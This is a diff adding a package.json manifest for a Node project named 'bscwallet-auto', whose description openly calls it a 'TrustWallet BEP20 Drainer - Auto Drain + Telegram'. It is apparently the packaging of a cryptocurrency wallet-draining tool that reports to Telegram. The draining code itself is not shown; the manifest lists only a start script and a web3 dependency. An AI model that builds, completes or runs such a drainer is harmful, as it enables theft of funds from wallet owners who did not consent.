@@ -1,0 +1,12 @@
+{
+  "name": "bscwallet-auto",
+  "version": "3.0.0",
+  "description": "TrustWallet BEP20 Drainer - Auto Drain + Telegram",
+  "main": "server/index.js",
+  "scripts": {
+    "start": "node server/index.js"
+  },
+  "dependencies": {
+    "web3": "^1.10.0"
+  }
+}
